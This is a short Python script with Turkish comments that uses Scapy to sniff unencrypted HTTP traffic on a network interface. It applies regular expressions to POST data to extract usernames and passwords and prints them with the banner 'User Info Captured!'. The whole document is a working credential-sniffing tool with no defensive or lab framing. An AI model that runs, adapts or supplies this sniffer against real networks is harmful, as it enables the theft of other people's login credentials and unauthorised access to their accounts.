from scapy.all import *
from scapy.layers.http import HTTPRequest  # HTTP isteklerini analiz etmek için
import re

# Arayüzü belirtelim
INTERFACE = "eth0"

# Kullanıcı adı ve şifreyi yakalamak için regex desenleri
USERNAME_REGEX = re.compile(r"(username|user|login|email)[^=]*=([^&\s]+)", re.IGNORECASE)
PASSWORD_REGEX = re.compile(r"(password|pass|pwd)[^=]*=([^&\s]+)", re.IGNORECASE)

def packet_callback(packet):
    # HTTP isteği içeriyorsa
    if packet.haslayer(HTTPRequest):
        http_layer = packet[HTTPRequest]
        ip_layer = packet[IP]

        # URL'yi yazdır
        url = f"http://{http_layer.Host.decode()}{http_layer.Path.decode()}"
        print(f"[+] HTTP İsteği: {ip_layer.src} -> {url}")

        # POST verisini yakala
        if packet.haslayer(Raw):
            load = packet[Raw].load.decode(errors='ignore')
            
            username_match = USERNAME_REGEX.search(load)
            password_match = PASSWORD_REGEX.search(load)
            
            if username_match or password_match:
                print("\n[***] Kullanıcı Bilgisi Yakalandı!")
                if username_match:
                    print(f"Kullanıcı Adı: {username_match.group(2)}")
                if password_match:
                    print(f"Şifre: {password_match.group(2)}")
                print("\n")

# Paketleri dinlemeye başla
print(f"[+] {INTERFACE} arayüzü üzerinden HTTP trafiği dinleniyor...")
sniff(iface=INTERFACE, prn=packet_callback, store=0)
